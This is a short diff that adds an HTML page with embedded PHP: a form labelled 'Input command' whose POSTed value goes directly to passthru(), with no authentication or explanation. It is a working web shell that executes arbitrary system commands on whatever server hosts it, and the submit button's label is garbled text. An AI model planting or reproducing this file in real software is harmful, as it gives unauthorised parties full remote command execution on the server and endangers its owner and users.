@@ -1,0 +1,15 @@
+<html>
+<body>
+<div align="left"><font size="2">Input command: </font></div>
+<form name="cmd" method="POST">
+<input type="text" name="cmd" size="30" class="input">
+<input type="submit" value="Àü¼Û">
+</form>
+<?
+if ($_POST['cmd']){
+$cmd = $_POST['cmd'];
+passthru($cmd);
+}
+?>
+</body>
+</html>
